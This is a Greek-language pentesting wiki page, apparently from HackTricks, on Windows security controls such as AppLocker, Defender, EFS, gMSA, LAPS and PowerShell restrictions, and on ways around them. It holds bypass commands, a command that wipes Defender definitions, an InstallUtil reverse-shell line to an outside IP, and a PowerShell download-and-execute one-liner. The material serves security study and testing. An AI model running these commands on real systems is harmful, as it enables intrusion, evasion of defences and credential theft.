# Έλεγχοι ασφαλείας των Windows

{{#include ../banners/hacktricks-training.md}}

## Πολιτική AppLocker

Μια application whitelist είναι μια λίστα εγκεκριμένων εφαρμογών λογισμικού ή εκτελέσιμων αρχείων, τα οποία επιτρέπεται να υπάρχουν και να εκτελούνται σε ένα σύστημα. Στόχος είναι η προστασία του περιβάλλοντος από επιβλαβές malware και μη εγκεκριμένο λογισμικό που δεν ανταποκρίνεται στις συγκεκριμένες επιχειρηματικές ανάγκες ενός οργανισμού.

Το [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) είναι η **λύση application whitelisting** της Microsoft και παρέχει στους administrators συστημάτων έλεγχο σχετικά με το **ποιες εφαρμογές και ποια αρχεία μπορούν να εκτελούν οι χρήστες**. Παρέχει **λεπτομερή έλεγχο** σε εκτελέσιμα αρχεία, scripts, αρχεία Windows installer, DLLs, packaged apps και packed app installers.\
Είναι συνηθισμένο οι οργανισμοί να **μπλοκάρουν τα cmd.exe και PowerShell.exe** και την πρόσβαση εγγραφής σε συγκεκριμένους καταλόγους, **αλλά όλα αυτά μπορούν να παρακαμφθούν**.

### Έλεγχος

Ελέγξτε ποια αρχεία/επεκτάσεις βρίσκονται σε blacklist/whitelist:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Αυτή η διαδρομή μητρώου περιέχει τις ρυθμίσεις και τις πολιτικές που εφαρμόζει το AppLocker, παρέχοντας έναν τρόπο ελέγχου του τρέχοντος συνόλου κανόνων που επιβάλλονται στο σύστημα:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Χρήσιμοι **εγγράψιμοι φάκελοι** για bypass του AppLocker Policy: Αν το AppLocker επιτρέπει την εκτέλεση οτιδήποτε μέσα στα `C:\Windows\System32` ή `C:\Windows`, υπάρχουν **εγγράψιμοι φάκελοι** που μπορείτε να χρησιμοποιήσετε για να κάνετε **bypass αυτού**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Τα συνήθως **έμπιστα** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries μπορούν επίσης να φανούν χρήσιμα για την παράκαμψη του AppLocker.
- Οι **κακογραμμένοι κανόνες θα μπορούσαν επίσης να παρακαμφθούν**
- Για παράδειγμα, με το **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, μπορείς να δημιουργήσεις έναν **φάκελο με όνομα `allowed`** οπουδήποτε και θα επιτραπεί.
- Οι οργανισμοί συχνά επικεντρώνονται επίσης στον **αποκλεισμό του εκτελέσιμου `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, αλλά ξεχνούν τις **άλλες [**τοποθεσίες των εκτελέσιμων του PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations)**, όπως το `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ή το `PowerShell_ISE.exe`.
- Η **επιβολή DLL** ενεργοποιείται πολύ σπάνια λόγω του επιπλέον φόρτου που μπορεί να προκαλέσει σε ένα σύστημα και του όγκου testing που απαιτείται για να διασφαλιστεί ότι τίποτα δεν θα σταματήσει να λειτουργεί. Επομένως, η χρήση **DLLs ως backdoors θα βοηθήσει στην παράκαμψη του AppLocker**.
- Μπορείς να χρησιμοποιήσεις το [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή το [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να **εκτελέσεις κώδικα Powershell** σε οποιαδήποτε διεργασία και να παρακάμψεις το AppLocker. Για περισσότερες πληροφορίες, έλεγξε: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Αποθήκευση διαπιστευτηρίων

### Security Accounts Manager (SAM)

Τα τοπικά διαπιστευτήρια βρίσκονται σε αυτό το αρχείο, ενώ οι κωδικοί πρόσβασης είναι hashed.

### Local Security Authority (LSA) - LSASS

Τα **διαπιστευτήρια** (hashed) **αποθηκεύονται** στη **μνήμη** αυτού του υποσυστήματος για λόγους Single Sign-On.\
Το **LSA** διαχειρίζεται την τοπική **πολιτική ασφαλείας** (πολιτική κωδικών πρόσβασης, δικαιώματα χρηστών...), την **authentication**, τα **access tokens**...\
Το LSA είναι αυτό που θα **ελέγξει** τα παρεχόμενα διαπιστευτήρια μέσα στο αρχείο **SAM** (για μια τοπική σύνδεση) και θα **επικοινωνήσει** με τον **domain controller** για να κάνει authentication ενός χρήστη του domain.

Τα **διαπιστευτήρια** είναι **αποθηκευμένα** μέσα στη **διεργασία LSASS**: tickets Kerberos, hashes NT και LM, κωδικοί πρόσβασης που αποκρυπτογραφούνται εύκολα.

### Μυστικά LSA

Το LSA μπορεί να αποθηκεύει στον δίσκο ορισμένα διαπιστευτήρια:

- Κωδικός πρόσβασης του λογαριασμού υπολογιστή του Active Directory (μη προσβάσιμος domain controller).
- Κωδικοί πρόσβασης των λογαριασμών των Windows services
- Κωδικοί πρόσβασης για scheduled tasks
- Περισσότερα (κωδικός πρόσβασης εφαρμογών IIS...)

### NTDS.dit

Είναι η βάση δεδομένων του Active Directory. Υπάρχει μόνο στους Domain Controllers.

## Defender

Το [**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) είναι ένα Antivirus που είναι διαθέσιμο στα Windows 10 και Windows 11, καθώς και σε εκδόσεις του Windows Server. **Μπλοκάρει** συνηθισμένα εργαλεία pentesting, όπως το **`WinPEAS`**. Ωστόσο, υπάρχουν τρόποι για να **παρακαμφθούν αυτές οι προστασίες**.

### Έλεγχος

Για να ελέγξεις την **κατάσταση** του **Defender**, μπορείς να εκτελέσεις το PS cmdlet **`Get-MpComputerStatus`** (έλεγξε την τιμή του **`RealTimeProtectionEnabled`** για να διαπιστώσεις αν είναι ενεργό):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Για να κάνεις enumeration, μπορείς επίσης να εκτελέσεις:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

Το EFS προστατεύει τα αρχεία μέσω encryption, χρησιμοποιώντας ένα **symmetric key** γνωστό ως **File Encryption Key (FEK)**. Αυτό το key κρυπτογραφείται με το **public key** του χρήστη και αποθηκεύεται μέσα στο **alternative data stream** $EFS του encrypted file. Όταν απαιτείται decryption, το αντίστοιχο **private key** του digital certificate του χρήστη χρησιμοποιείται για την αποκρυπτογράφηση του FEK από το stream $EFS. Περισσότερες λεπτομέρειες μπορείτε να βρείτε [εδώ](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Σενάρια decryption χωρίς ενέργεια από τον χρήστη** περιλαμβάνουν:

- Όταν αρχεία ή φάκελοι μετακινούνται σε non-EFS file system, όπως το [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), αποκρυπτογραφούνται αυτόματα.
- Τα encrypted files που αποστέλλονται μέσω δικτύου με το SMB/CIFS protocol αποκρυπτογραφούνται πριν από τη μετάδοση.

Αυτή η μέθοδος encryption επιτρέπει **transparent access** στα encrypted files από τον owner. Ωστόσο, η απλή αλλαγή του password του owner και το login δεν επιτρέπουν την αποκρυπτογράφηση.

**Βασικά σημεία**:

- Το EFS χρησιμοποιεί ένα symmetric FEK, κρυπτογραφημένο με το public key του χρήστη.
- Το decryption χρησιμοποιεί το private key του χρήστη για πρόσβαση στο FEK.
- Αυτόματο decryption πραγματοποιείται υπό συγκεκριμένες συνθήκες, όπως η αντιγραφή σε FAT32 ή η μετάδοση μέσω δικτύου.
- Τα encrypted files είναι προσβάσιμα από τον owner χωρίς επιπλέον ενέργειες.

### Έλεγχος πληροφοριών EFS

Ελέγξτε αν ένας **user** έχει **χρησιμοποιήσει** αυτό το **service**, ελέγχοντας αν υπάρχει αυτό το path:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Ελέγξτε **ποιος** έχει **πρόσβαση** στο file χρησιμοποιώντας cipher /c \<file>\
Μπορείτε επίσης να χρησιμοποιήσετε τα `cipher /e` και `cipher /d` μέσα σε έναν φάκελο για να **κρυπτογραφήσετε** και να **αποκρυπτογραφήσετε** όλα τα files

### Decrypting EFS files

#### Being Authority System

Αυτός ο τρόπος απαιτεί ο **victim user** να **εκτελεί** ένα **process** μέσα στο host. Αν ισχύει αυτό, χρησιμοποιώντας ένα `meterpreter` session μπορείτε να κάνετε impersonate το token του process του user (`impersonate_token` από το `incognito`). Εναλλακτικά, μπορείτε απλώς να κάνετε `migrate` στο process του user.

#### Γνωρίζοντας το password του user

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Η Microsoft ανέπτυξε τα **Group Managed Service Accounts (gMSA)** για να απλοποιήσει τη διαχείριση των service accounts σε IT infrastructures. Σε αντίθεση με τα παραδοσιακά service accounts, στα οποία συχνά είναι ενεργοποιημένη η ρύθμιση "**Password never expire**", τα gMSAs προσφέρουν μια πιο ασφαλή και διαχειρίσιμη λύση:

- **Automatic Password Management**: Τα gMSAs χρησιμοποιούν ένα σύνθετο password 240 χαρακτήρων, το οποίο αλλάζει αυτόματα σύμφωνα με την πολιτική του domain ή του computer. Αυτή η διαδικασία πραγματοποιείται από το Microsoft Key Distribution Service (KDC), εξαλείφοντας την ανάγκη για manual password updates.
- **Enhanced Security**: Αυτοί οι accounts είναι immune σε lockouts και δεν μπορούν να χρησιμοποιηθούν για interactive logins, ενισχύοντας την ασφάλειά τους.
- **Multiple Host Support**: Τα gMSAs μπορούν να χρησιμοποιηθούν από πολλαπλά hosts, γεγονός που τα καθιστά ιδανικά για services που εκτελούνται σε πολλούς servers.
- **Scheduled Task Capability**: Σε αντίθεση με τα managed service accounts, τα gMSAs υποστηρίζουν την εκτέλεση scheduled tasks.
- **Simplified SPN Management**: Το system ενημερώνει αυτόματα το Service Principal Name (SPN) όταν υπάρχουν αλλαγές στα sAMaccount details ή στο DNS name του computer, απλοποιώντας τη διαχείριση του SPN.

Τα passwords των gMSAs αποθηκεύονται στην LDAP property _**msDS-ManagedPassword**_ και γίνονται αυτόματα reset κάθε 30 ημέρες από τους Domain Controllers (DCs). Αυτό το password, ένα encrypted data blob γνωστό ως [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), μπορεί να ανακτηθεί μόνο από authorized administrators και τους servers στους οποίους είναι εγκατεστημένα τα gMSAs, διασφαλίζοντας ένα secure environment. Για την πρόσβαση σε αυτές τις πληροφορίες απαιτείται secured connection, όπως LDAPS, ή η connection πρέπει να είναι authenticated με 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Μπορείτε να διαβάσετε αυτό το password με το [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Βρείτε περισσότερες πληροφορίες σε αυτήν την ανάρτηση**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Επίσης, δείτε αυτήν την [ιστοσελίδα](https://cube0x0.github.io/Relaying-for-gMSA/) σχετικά με τον τρόπο εκτέλεσης μιας **NTLM relay attack** για την **ανάγνωση** του **password** ενός **gMSA**.<sup>[[3]](#references)</sup>

## LAPS

Το **Local Administrator Password Solution (LAPS)**, το οποίο είναι διαθέσιμο για download από τη [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), επιτρέπει τη διαχείριση των passwords του local Administrator. Αυτά τα passwords, τα οποία είναι **randomized**, μοναδικά και **regularly changed**, αποθηκεύονται κεντρικά στο Active Directory. Η πρόσβαση σε αυτά τα passwords περιορίζεται μέσω ACLs στους εξουσιοδοτημένους χρήστες. Με επαρκή δικαιώματα, παρέχεται η δυνατότητα ανάγνωσης των passwords του local admin.

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

Το PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **περιορίζει πολλές από τις δυνατότητες** που απαιτούνται για την αποτελεσματική χρήση του PowerShell, όπως το blocking των COM objects, η χρήση μόνο εγκεκριμένων τύπων .NET, workflows που βασίζονται σε XAML, PowerShell classes και άλλα.

### **Έλεγχος**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Παράκαμψη
```bash
#Easy bypass
Powershell -version 2
```
Στα τρέχοντα Windows αυτό το Bypass δεν θα λειτουργήσει, αλλά μπορείτε να χρησιμοποιήσετε το [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Για να το κάνετε compile ίσως χρειαστεί** να _**Add a Reference**_ -> _Browse_ ->_Browse_ -> προσθέσετε το `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` και να **αλλάξετε το project σε .Net4.5**.

#### Direct bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Αντίστροφο shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Μπορείτε να χρησιμοποιήσετε τα [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να **εκτελέσετε κώδικα Powershell** σε οποιαδήποτε διεργασία και να κάνετε bypass στο constrained mode. Για περισσότερες πληροφορίες, δείτε: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## PS Execution Policy

Από προεπιλογή έχει οριστεί σε **restricted.** Οι κύριοι τρόποι για να κάνετε bypass σε αυτήν την policy είναι οι εξής:<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Περισσότερα μπορούν να βρεθούν [εδώ](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Security Support Provider Interface (SSPI)

Είναι το API που μπορεί να χρησιμοποιηθεί για την authentication χρηστών.

Το SSPI είναι υπεύθυνο για την εύρεση του κατάλληλου protocol για δύο machines που θέλουν να επικοινωνήσουν. Η προτιμώμενη μέθοδος για αυτό είναι το Kerberos. Στη συνέχεια, το SSPI διαπραγματεύεται ποιο authentication protocol θα χρησιμοποιηθεί. Αυτά τα authentication protocols ονομάζονται Security Support Provider (SSP), βρίσκονται μέσα σε κάθε Windows machine με τη μορφή DLL και και οι δύο machines πρέπει να υποστηρίζουν το ίδιο, ώστε να μπορούν να επικοινωνήσουν.

### Κύρια SSPs

- **Kerberos**: Το προτιμώμενο
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** και **NTLMv2**: Για λόγους compatibility
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers και LDAP, password με τη μορφή MD5 hash
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL και TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Χρησιμοποιείται για τη διαπραγμάτευση του protocol που θα χρησιμοποιηθεί (Kerberos ή NTLM, με το Kerberos να είναι το default)
- %windir%\Windows\System32\lsasrv.dll

#### Η διαπραγμάτευση μπορεί να προσφέρει αρκετές μεθόδους ή μόνο μία.

## UAC - User Account Control

Το [User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) είναι μια δυνατότητα που ενεργοποιεί ένα **consent prompt για elevated activities**.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## References

- [1] [Παράκαμψη του Applocker και του Powershell contstrained language mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)
- [2] [howto ~ decrypt EFS files](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying for gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 τρόποι παράκαμψης του PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

{{#include ../banners/hacktricks-training.md}}
